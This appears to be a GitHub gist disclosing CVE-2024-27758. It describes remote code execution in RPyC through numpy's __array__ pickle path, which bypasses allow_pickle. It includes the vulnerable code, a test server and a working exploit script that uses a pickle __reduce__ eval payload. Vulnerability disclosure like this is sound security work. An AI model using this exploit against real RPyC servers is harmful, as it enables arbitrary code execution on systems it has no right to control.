
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@renbou](https://avatars.githubusercontent.com/u/30644072?s=64&v=4)](/renbou)

# [renbou](/renbou)/**[CVE-2024-27758.md](/renbou/957f70d27470982994f12a1d70153d09)**

Last active
March 6, 2024 07:15

Show Gist options

* [Download ZIP](/renbou/957f70d27470982994f12a1d70153d09/archive/be8bd4302c4c737d4407c5b815394e0340d276bc.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/renbou/957f70d27470982994f12a1d70153d09.js&quot;&gt;&lt;/script&gt;
* Save renbou/957f70d27470982994f12a1d70153d09 to your computer and use it in GitHub Desktop.

[Code](/renbou/957f70d27470982994f12a1d70153d09)
[Revisions
4](/renbou/957f70d27470982994f12a1d70153d09/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/renbou/957f70d27470982994f12a1d70153d09.js&quot;&gt;&lt;/script&gt;

Save renbou/957f70d27470982994f12a1d70153d09 to your computer and use it in GitHub Desktop.

[Download ZIP](/renbou/957f70d27470982994f12a1d70153d09/archive/be8bd4302c4c737d4407c5b815394e0340d276bc.zip)

RCE in RPyC bypassing the allow\_pickle setting

 [Raw](/renbou/957f70d27470982994f12a1d70153d09/raw/be8bd4302c4c737d4407c5b815394e0340d276bc/CVE-2024-27758.md)

[**CVE-2024-27758.md**](#file-cve-2024-27758-md)

# RCE in RPyC bypassing the allow\_pickle setting

As stated in RPyC documentation, new-style (since RPyC 3.00) RPyC servers aren't meant to allow clients complete control over the server:

* <https://rpyc.readthedocs.io/en/latest/tutorial/tut3.html>, *The new model is service oriented: services provide a way to expose a well-defined set of capabilities to the other party...*
* <https://rpyc.readthedocs.io/en/latest/docs/security.html>, *Unlike version 2.6, RPyC no longer makes use of insecure protocols like pickle,...*

And the previous case of such bug has been registered as the critical [CVE-2019-16328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16328) through which arbitrary code execution with default configuration settings is possible. This vulnerability achieves the same goal through the numpy array deserialization mechanism added to resolve Issue #236, "Trouble accessing remote numpy objects" ([tomerfiliba-org/rpyc#236](https://github.com/tomerfiliba-org/rpyc/issues/236)), which seems to have slipped under the radar and circumvents the available `allow_pickle` configuration parameter, which is `False`, by default (<https://github.com/tomerfiliba-org/rpyc/blob/5.3.1/rpyc/core/protocol.py#L63>). The vulnerability seems to have been added as a resolution to the aforementioned issue in commit 9f45f8269d4106905db61d82cd529cacdb178911 (<https://github.com/tomerfiliba-org/rpyc/commit/9f45f8269d4106905db61d82cd529cacdb178911>), and is present in the library from version `4.0.0` up to the most recent `5.3.1`, and in the main repository branch.

For extra context, here is the vulnerable piece of code from the commit:

```
def _make_method(name, doc):
    ...
    elif name == "__array__":
        def __array__(self):
            # Note that protocol=-1 will only work between python
            # interpreters of the same version.
            return pickle.loads(syncreq(self, consts.HANDLE_PICKLE, -1))
        __array__.__doc__ = doc
        return __array__
    ...
```

This is called during any remote object instantiation during the packet decoding procedure (`_unbox` -> `_netref_factory` -> `class_factory` -> `_make_method`): <https://github.com/tomerfiliba-org/rpyc/blob/5.3.1/rpyc/core/protocol.py#L338> if the remote object has an `__array__` method. The `__array__` method is used by numpy, as stated in the `numpy.array` documentation (<https://numpy.org/doc/stable/reference/generated/numpy.array.html>), to convert "array-like" objects to numpy arrays. Being a well-established API, it is used everywhere in numpy itself, and in all major ML libraries, such as the well-known scikit-learn library. Such usecase is native for RPyC, which can also be validated by the number of issues present even by a search term as basic as "numpy": <https://github.com/tomerfiliba-org/rpyc/issues?q=numpy>.

## Proof of Concept

`requirements.txt` specify the version of the Python pip dependencies installed to test the vulnerability. To point out, version `5.3.1` is the latest available version of RPyC.

The presented `server.py` script contains an example server implementing some basic ML-like functionality exposed using RPyC. No custom configuration is used and no modifications are made to the getter/setter logic of the service, this is as basic as the example in the documentation itself. Here is its source code, additionally:

```
import numpy as np
import numpy.typing as npt
import rpyc
from sklearn.linear_model import LinearRegression
from sklearn.model_selection import train_test_split

# ExampleService performing some absolutely basic tasks related to distributed computing and ML.
class ExampleService(rpyc.Service):
    def exposed_example1(self, x: npt.ArrayLike, y: npt.ArrayLike) -> LinearRegression:
        return LinearRegression().fit(np.array(x), np.array(y))

    def exposed_example2(self, x: npt.ArrayLike, y: npt.ArrayLike) -> list[np.ndarray]:
        return train_test_split(x, y)

server = rpyc.ThreadedServer(ExampleService, hostname="127.0.0.1", port=1337)
print(
    f"RPyC PoC by renbou. Starting example RPyC server on {server.host}:{server.port}"
)
server.start()
```

The presented `exploit.py` script then achieves RCE on the server process via both of the available methods, and their underlying calls of the `__array__` method. The client's configuration sets `allow_pickle` to `True` in order to enable pickle dumping on the client's side and greatly simplify the exploit without needing to write custom RPyC protocol packets and pickle serialization. After launching the server, running the exploit should cause the server to evaluate the example `print` statements specified, which can be changed to any valid python code. Here is its source code, additionally:

```
import rpyc

class Exploit:
    def __init__(self, code: str):
        self.code = code

    def _rpyc_getattr(self, name):
        print(name)

    # __array__ method present so that it is listed in dir(), and server sees that it is available
    def __array__(self):
        pass

    # __reduce__ is called locally during pickle.dumps,
    # and is simply an easy way to construct the pickle payload
    def __reduce__(self):
        return (__import__("builtins").eval, (self.code,))

print("RPyC PoC by renbou. Connecting to RPyC server and running eval inside it.")

# Create connection and enable allow_pickle on client, so that HANDLE_PICKLE dumps the object.
conn: rpyc.Connection = rpyc.connect(
    host="127.0.0.1", port=1337, config=dict(allow_pickle=True)
)

# example1 directly calls __array__ through np.array
try:
    conn.root.example1(
        Exploit("print('RPyC PoC by renbou: rce on server via direct np.array')"), []
    )
except:
    pass

# example2 calls train_test_split -> indexable -> _make_indexable -> np.array
try:
    conn.root.example1(
        Exploit("print('RPyC PoC by renbou: rce on server via train_test_split')"), []
    )
except:
    pass
```

 [Raw](/renbou/957f70d27470982994f12a1d70153d09/raw/be8bd4302c4c737d4407c5b815394e0340d276bc/exploit.py)

[**exploit.py**](#file-exploit-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import rpyc |
| --- | --- |
|  |  |
|  |  |
|  | class Exploit: |
|  | def \_\_init\_\_(self, code: str): |
|  | self.code = code |
|  |  |
|  | def \_rpyc\_getattr(self, name): |
|  | print(name) |
|  |  |
|  | # \_\_array\_\_ method present so that it is listed in dir(), and server sees that it is available |
|  | def \_\_array\_\_(self): |
|  | pass |
|  |  |
|  | # \_\_reduce\_\_ is called locally during pickle.dumps, |
|  | # and is simply an easy way to construct the pickle payload |
|  | def \_\_reduce\_\_(self): |
|  | return (\_\_import\_\_("builtins").eval, (self.code,)) |
|  |  |
|  |  |
|  | print("RPyC PoC by renbou. Connecting to RPyC server and running eval inside it.") |
|  |  |
|  | # Create connection and enable allow\_pickle on client, so that HANDLE\_PICKLE dumps the object. |
|  | conn: rpyc.Connection = rpyc.connect( |
|  | host="127.0.0.1", port=1337, config=dict(allow\_pickle=True) |
|  | ) |
|  |  |
|  | # example1 directly calls \_\_array\_\_ through np.array |
|  | try: |
|  | conn.root.example1( |
|  | Exploit("print('RPyC PoC by renbou: rce on server via direct np.array')"), [] |
|  | ) |
|  | except: |
|  | pass |
|  |  |
|  | # example2 calls train\_test\_split -> indexable -> \_make\_indexable -> np.array |
|  | try: |
|  | conn.root.example1( |
|  | Exploit("print('RPyC PoC by renbou: rce on server via train\_test\_split')"), [] |
|  | ) |
|  | except: |
|  | pass |

 [Raw](/renbou/957f70d27470982994f12a1d70153d09/raw/be8bd4302c4c737d4407c5b815394e0340d276bc/requirements.txt)

[**requirements.txt**](#file-requirements-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | rpyc==5.3.1 |
| --- | --- |
|  | numpy==1.26.4 |
|  | scikit-learn==1.4.0 |

 [Raw](/renbou/957f70d27470982994f12a1d70153d09/raw/be8bd4302c4c737d4407c5b815394e0340d276bc/server.py)

[**server.py**](#file-server-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import numpy as np |
| --- | --- |
|  | import numpy.typing as npt |
|  | import rpyc |
|  | from sklearn.linear\_model import LinearRegression |
|  | from sklearn.model\_selection import train\_test\_split |
|  |  |
|  |  |
|  | # ExampleService performing some absolutely basic tasks related to distributed computing and ML. |
|  | class ExampleService(rpyc.Service): |
|  | def exposed\_example1(self, x: npt.ArrayLike, y: npt.ArrayLike) -> LinearRegression: |
|  | return LinearRegression().fit(np.array(x), np.array(y)) |
|  |  |
|  | def exposed\_example2(self, x: npt.ArrayLike, y: npt.ArrayLike) -> list[np.ndarray]: |
|  | return train\_test\_split(x, y) |
|  |  |
|  |  |
|  | server = rpyc.ThreadedServer(ExampleService, hostname="127.0.0.1", port=1337) |
|  | print( |
|  | f"RPyC PoC by renbou. Starting example RPyC server on {server.host}:{server.port}" |
|  | ) |
|  | server.start() |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Frenbou%2F957f70d27470982994f12a1d70153d09)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

